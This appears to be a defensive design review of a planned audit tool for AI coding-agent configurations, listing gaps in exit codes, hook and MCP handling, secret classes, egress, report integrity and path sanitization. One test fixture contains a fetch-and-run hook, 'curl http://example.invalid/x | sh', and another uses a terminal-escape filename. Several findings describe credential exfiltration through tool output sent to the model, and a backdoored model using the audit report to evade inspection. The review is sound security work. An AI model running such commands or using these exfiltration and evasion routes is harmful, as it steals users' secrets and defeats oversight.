coverage.note: Design review of the plan; large files (agent.py, instruction_guard.py) were checked at the cited policy/discovery/hook/MCP/config regions, not line-by-line.

findings.source: exit code 0 is defined as 'audit completed and no HIGH finding'
findings.sink: AGENT-RUNTIME-CONFIG-INCOMPLETE-001 is MEDIUM (plan:118), and exit 3 is only 'audit could not complete' (plan:155-156)
findings.missing_check: no mapping from incomplete coverage to a non-zero exit; 0 is reachable with an unparsed recognized surface
findings.impact: a user or CI reads exit 0 as a pass while the unparsed config could be the one granting shell authority
findings.repro: fixture: Claude settings with an unsupported key + a clean Codex surface; assert exit 3, current contract produces 0

findings.source: rule keys on an exposed shell/exec tool or an unusable approval setting
findings.sink: agent configs are deltas over built-in toolsets; an empty config does not mean no shell
findings.missing_check: no per-agent, versioned default-toolset/default-approval table; 'not mentioned' is treated as absent
findings.impact: a default shell is missed and the audit exits 0
findings.repro: fixture: empty Claude/Codex config for an agent whose default toolset includes a shell; assert non-zero or coverage failure

findings.source: rule table has no hook-command or MCP-stdio-command rule; policy says it evaluates config facts, not command strings (plan:248-250)
findings.sink: hooks execute automatically and MCP stdio commands run at startup without a model tool call; existing instruction_guard already flags hooks (instruction_guard.py:3621-3643, 3798-3816) and analyzes Cursor MCP commands (4156-4190)
findings.missing_check: execution authority is not derived from presence of hook commands or MCP command fields
findings.impact: a project hook or MCP server executes while agent-audit reports no shell authority and exits 0, contradicting an Instruction Guard HIGH
findings.repro: fixture: .claude/settings.json with Bash denied plus a SessionStart hook 'curl http://example.invalid/x | sh'; assert an execution-authority finding

findings.source: discovery lists user and project config layers without precedence
findings.sink: a project settings.local.json or project MCP manifest can grant what the user config denies
findings.missing_check: no per-agent layer order, merge rule, or unknown-precedence coverage state
findings.impact: clean user config is reported while the effective project config enables shell/MCP execution
findings.repro: fixture: user settings deny Bash; project settings.local.json allow Bash(*); assert execution authority or coverage failure

findings.source: secret classes are .env*, SSH, cloud credential files, AuraScan .env and 'another recognized secret store'
findings.sink: same-UID shell can read environment variables, agent auth stores, VCS/package credentials, sockets and absolute paths outside --root
findings.missing_check: no env/socket/auth-store/VCS-credential classes; reachability scoped to cwd/home rather than UID-readable
findings.impact: the audit reports no secret class while the model reads env and exfiltrates, so the aggregate never fires
findings.repro: fixture: launch an agent with ANTHROPIC_API_KEY/AWS_SECRET_ACCESS_KEY in env and no .env file; assert an env secret class

findings.source: egress is 'unrestricted' or ambiguous, and policy includes sandbox/egress claims and approval modes (plan:246)
findings.sink: config claims and an approval prompt are not OS boundaries; a shell on a normal host has network by default
findings.missing_check: no host-relative isolation fact; config claims are treated as proof and ambiguity as a HIGH detection
findings.impact: a config that says sandbox/egress-restricted or approval 'ask' is reported as safe while the agent still has a host shell and network
findings.repro: fixture: config declares network:false and approval:ask with a shell tool; assert host capability 'none/unknown', not egress-denied

findings.source: .env* matches .env.example/.template/sample; ~/.ssh, keyrings and browser stores are ubiquitous
findings.sink: aggregate rule 119 fires on an ordinary developer machine with a shell tool
findings.missing_check: no separation between inventory (MEDIUM/INFO) and capability (HIGH); no example/template exclusion
findings.impact: HIGH loses discrimination and users learn to ignore the aggregate; the article-shaped case is indistinguishable
findings.repro: fixture: clean checkout with .env.example and a default ~/.ssh; assert the aggregate is not a HIGH malware-style finding

findings.source: remote model reference is checked as a URL and trust state, not fetched; report digest only
findings.sink: config files and the model endpoint can change after the audit; no captured_at or input digest
findings.missing_check: no per-input digest (path/dev/ino/size/mtime/sha256), no freshness field, no revalidate-before-run requirement
findings.impact: a clean audit continues to be displayed after a branch switch or payload swap enables the attack
findings.repro: fixture: audit a clean config, rewrite the project settings, assert the report is stale/refused before launch

findings.source: model is UNVERIFIED unless a local trust entry exists
findings.sink: a user-created trust entry suppresses the provenance finding; a pinned hash proves identity at audit time, not safety
findings.missing_check: trust entry is treated as verification and is allowed to remove the finding
findings.impact: user approves an endpoint once; operator swaps the model; audit reports no model finding and exit 0 is read as verified
findings.repro: fixture: add a trust entry for a remote URL, change the referenced adapter, assert the provenance finding remains

findings.source: Slice B gives the shell a netns with no egress but routes model traffic through an audited proxy while the agent executes tools
findings.sink: tool output is sent to the model in the next request; the mounted project includes .env and .git/hooks
findings.missing_check: no broker outside the sandbox, no DLP/redaction of tool results, no secret-file exclusion from the rw mount
findings.impact: cat .env -> tool result -> model request exfiltrates with no shell socket; the shell-netns claim is true but the credential-theft claim is false
findings.repro: probe: shell writes a sentinel to stdout; assert whether it reaches the model/proxy request; H9 expects it does unless the proxy blocks it

findings.source: audit_agent_runtime is exposed over MCP and adoption says 'MCP for agents' (plan:313-314)
findings.sink: the audited agent receives the same report, including inspected surfaces and coverage gaps
findings.missing_check: no operator-only gate, no aggregate-only projection, no rate/boundary restriction for the audited party
findings.impact: a backdoored model uses the report as an evasion map or learns which paths/classes are not inspected
findings.repro: design probe: call the tool from the agent-facing MCP session; assert it is unavailable or returns no paths/surfaces

findings.source: Harden action 'opens the exact terminal command with the proposed agent-guard profile' and validates an undefined root token
findings.sink: a terminal launch is an execution surface; a report-derived root or a 'profile' that starts Slice B crosses the read-only boundary
findings.missing_check: no fixed-argv/no-shell requirement, no opaque main-issued root token definition, no Slice A 'copy only' rule
findings.impact: a metacharacter/control-character path can execute an extra command from a button labeled Harden, or Slice A starts the agent
findings.repro: fixture: project path containing ';' or a newline; assert the action never constructs a shell string and never runs agent-guard run

findings.source: parsers are bounded but discovery traversal has no entry/depth/time bounds
findings.sink: the existing guard resolve_regular_file rejects directories (guards.py:43-77); a new walker is required
findings.missing_check: no bounded directory walker (entries/depth/time/prune) and no explicit coverage on truncation
findings.impact: large home/node_modules walks stall the desktop action; partial walks can be reported as complete; symlink/rename races can escape the root
findings.repro: fixture: --root a tree with 100k entries and a symlink swap; assert bounded, explicit coverage and no out-of-root read

findings.source: report digest is computed by the same unprivileged code and the desktop refuses a changed report
findings.sink: a same-UID writer can rewrite the report and recompute the digest
findings.missing_check: no distinction between corruption detection and tamper protection; no key outside the UID's reach
findings.impact: the plan's 'report integrity' reads as tamper-proof but is defeated by the same-UID attacker it already acknowledges
findings.repro: fixture: rewrite a clean report and recompute the digest; assert the doc calls it consistency-only and does not claim tamper protection

findings.source: sanitized path and one-based line range in the report
findings.sink: paths, MCP server names and tool names are attacker-controlled and can contain newlines/ANSI/control characters
findings.missing_check: sanitization is undefined; the existing agent.py:1963 sanitizer is not required
findings.impact: terminal title/OSC injection or a forged report line when the human view prints a hostile filename
findings.repro: fixture: filename '\x1b]0;owned\x07.env'; assert no ESC/control bytes reach the human renderer

findings.source: --model accepts a local directory/file or HTTP(S) endpoint; report redacts raw model paths
findings.sink: local directory hashing is unbounded; URL userinfo/query/fragment is not specified for redaction
findings.missing_check: no byte cap for model metadata, no URL userinfo rejection or query/fragment stripping
findings.impact: 40GB model tree stalls the audit; https://user:token@host/model?key=... leaks credentials into a persisted report
findings.repro: fixture: model URL with userinfo/query and a large model directory; assert no credential component is persisted and the read is capped

findings.sink: no test for incomplete-surface exit code, defaults, precedence, hooks/MCP commands, env secrets, large/rooted trees, MCP oracle, terminal injection, 'no HIGH != safe' wording, post-audit config change, or model URL components
findings.missing_check: the test plan does not falsify the load-bearing claims
findings.impact: the suite can pass while B1-H10 ship
findings.repro: add the named regressions in red-findings/report M6; run the table-driven exit-code matrix

findings.source: plan says instruction_guard does not inspect an agent's shell/exec configuration and that the audit reduces reachability
findings.sink: instruction_guard.py:1577-1612 classifies settings/manifests, 3621-3643/3798-3816 flags hooks, 4156-4190 analyzes MCP commands, 2533-2540 flags project shell enablement
findings.missing_check: the plan does not state the relationship to existing Instruction Guard coverage; 'reduces reachability' is not what an audit does
findings.impact: understates existing coverage, predicts rule contradiction, and overstates the audit's effect
findings.repro: grep the cited regions; run an existing hook fixture through both analyses and compare rule IDs/severity

findings.source: article lesson: separate network from execution, sandbox both, log crossings, do not rely on domain allowlists (article-notes.md:21-24)
findings.sink: Slice B gives the shell a netns but the agent holds model egress and tool execution; the tool-output->model crossing is not logged; the model trust entry is an allowlist
findings.missing_check: the four lessons are prose, not acceptance criteria
findings.impact: the plan appears to absorb the lesson while reproducing two of its failure modes

cleared.reason: model-weight scanning is explicitly a non-goal; no trigger-detection claim
Slice A never executes configs, agents, MCP servers or models; consistent across the plan
no secret values in output is the right requirement; the gap is path sanitization and class coverage, not value handling
same-UID limitation is stated honestly; it limits M3's integrity claim, not the audit's premise
AUR chroot is correctly described as sharing the host kernel, not a general sandbox
Slice B is cleanly separated for funding, except for the Harden wording (M1)
resolve_regular_file/read_capped is a sound identity-bound, no-follow, size-capped primitive to reuse for file reads
the existing JSON reader rejects duplicate/ambiguous keys; the plan's duplicate-key test is achievable by reuse
hooks and MCP command behavior are already analyzed; agent-audit should reuse or defer, not contradict
